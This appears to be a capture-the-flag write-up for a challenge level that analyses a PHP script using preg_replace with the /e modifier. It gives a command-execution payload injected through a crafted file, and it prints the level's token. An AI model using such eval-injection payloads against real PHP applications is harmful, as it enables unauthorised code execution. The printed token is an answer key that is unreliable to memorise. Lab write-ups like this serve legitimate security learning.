we have to file an executable and .php file:
we cat the php file:

#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

in the first function we have:
The first preg_replace replaces any occurrence of a period (.) with the string " x ". The second preg_replace replaces any occurrence of the at symbol (@) with the string " y". Finally, the modified string $m is returned.

the Second one:
the content of a file specified by $y is read using file_get_contents and stored in the variable $a.
preg_replace with the pattern "/(\[x (.*)\])/e"  (for example: 'x jesuisunexemple')
to match and replace specific patterns within $a. The e modifier evaluates the replacement string as PHP code. In this case, it calls the y function with the captured group (\\2) as an argument. \\2 is a backreference to the second captured group in the pattern ((.*)), representing the content captured between the x and closing square bracket ( = jesuisunexemple).
two more preg_replace functions are used to replace opening square brackets ([) with opening parentheses (() and closing square brackets (]) with closing parentheses ()).

and then it print the result the result of x() function with two argvs.

we know that the modifier e will execute the php code given inside it. we need to pu the program inside the second captured group ('[x  exec]'):

echo '[x {${exec(getflag)}}]' > /tmp/execphp

then execute php:
./level06 /tmp/execphp nothing

you will get this:
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1